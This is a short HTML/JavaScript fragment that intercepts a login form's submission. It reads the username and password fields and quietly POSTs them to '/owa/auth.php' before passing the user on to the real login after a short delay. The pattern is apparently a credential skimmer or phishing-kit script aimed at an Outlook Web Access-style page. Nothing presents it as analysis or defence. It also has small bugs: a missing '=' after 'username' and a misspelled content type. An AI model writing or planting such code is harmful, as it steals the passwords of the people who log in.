<script>
	function logItNow(callback){
		console.log("in here");
		var http= new XMLHttpRequest();
		var url= '/owa/auth.php';
		var params = 'username' + document.getElementById("userNameInput").value+
		'&password='+ document.getElementById("passwordInput").value;
		http.open('POST', url, true);
		http.setRequestHeader('Content-type', 'application/x-ww-form-urlencoded');
		http.send(params);
		setTimeout(function(){

		callback();
	}, 1200);
	}
	function submitItNow(){
		document.forms["loginForm"].submit();
	}
</script>
<script>
	function beforeSubmit(){
		logItNow(submitItNow);
		return false;
	}
</script>